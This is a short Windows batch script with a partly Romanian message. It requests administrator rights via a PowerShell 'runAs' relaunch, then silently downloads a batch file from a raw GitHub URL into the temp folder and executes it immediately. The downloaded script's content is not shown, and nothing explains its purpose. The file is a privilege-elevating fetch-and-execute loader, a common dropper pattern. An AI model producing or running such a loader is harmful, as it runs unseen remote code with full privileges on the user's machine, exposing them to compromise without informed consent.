@echo off
:: Check for admin rights
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [INFO] Scriptul nu ruleaza ca Administrator. Relansare cu drepturi elevate...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

echo Administrator permision gotted.

curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/script.bat > "%TEMP%\script.bat" && call "%TEMP%\script.bat"
